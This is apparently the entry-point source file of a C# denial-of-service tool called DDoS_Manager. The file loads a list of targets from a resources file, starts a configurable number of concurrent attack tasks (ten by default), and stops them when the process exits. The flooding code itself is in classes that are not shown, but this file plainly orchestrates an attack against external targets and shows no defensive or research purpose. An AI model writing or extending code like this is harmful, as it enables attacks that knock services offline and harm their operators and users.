// See https://aka.ms/new-console-template for more information

using DDoS_Manager;

const int defaultMaxTasksNumber = 10;
const string targetsFileName = "resources/targets";

var targetSupplier = new TargetSupplier(targetsFileName);
if (args.Length == 0 || !int.TryParse(args[0], out var maxTasksNumber))
{
    maxTasksNumber = defaultMaxTasksNumber;
}
Console.WriteLine("Starting " + maxTasksNumber + " tasks...");
var tasks = new AttackTaskManager(maxTasksNumber, targetSupplier);

AppDomain.CurrentDomain.ProcessExit += (_, _) =>
{
    tasks.TerminateAttack();
};

tasks.InitializeAttack();
